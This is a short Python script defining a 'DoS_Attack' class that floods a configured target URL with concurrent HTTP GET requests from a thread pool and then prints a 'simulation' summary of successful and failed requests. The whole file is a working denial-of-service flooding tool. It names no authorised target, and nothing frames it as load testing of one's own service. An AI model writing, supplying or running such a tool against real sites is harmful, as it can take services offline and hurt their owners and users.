import requests
from concurrent.futures import ThreadPoolExecutor, as_completed


# Removed unused 'threading' and 'time' imports

class DoS_Attack:

    def __init__(self, config):

            self.target_url = config.get('TARGET_URL')
            self.num_threads = config.getint('NUM_THREADS')
            self.reqs_per_thread = config.getint('REQUESTS_PER_THREAD')


    def send_requests(self):

        success_count = 0
        failure_count = 0

        for _ in range(self.reqs_per_thread):
            try:

                response = requests.get(self.target_url, timeout=5)
                print(f"Request sent, status code: {response.status_code}")
                if 200 <= response.status_code < 300:
                    success_count += 1
                else:
                    failure_count += 1
            except requests.exceptions.RequestException:

                failure_count += 1

        return success_count, failure_count

    def create_thread_pool(self):  # Renamed from creat_thread_pool (PEP 8)


        print(f"Starting simulation: {self.num_threads} threads, "
              f"{self.reqs_per_thread} reqs/thread...")
        print(f"Target: {self.target_url}")

        total_success = 0
        total_failure = 0


        with ThreadPoolExecutor(max_workers=self.num_threads) as executor:


            futures = [executor.submit(self.send_requests)
                       for _ in range(self.num_threads)]


            for future in as_completed(futures):
                try:
                    success, failure = future.result()
                    total_success += success
                    total_failure += failure
                except Exception as e:
                    # Handle exceptions from the thread's task itself
                    print(f"A thread task failed: {e}")
                    # Assume all requests for this thread failed
                    total_failure += self.reqs_per_thread

        print("\n--- Simulation Summary ---")
        total_reqs = self.num_threads * self.reqs_per_thread
        print(f"Total Requests Attempted: {total_reqs}")
        print(f"Successful (2xx):       {total_success}")
        print(f"Failed:                 {total_failure}")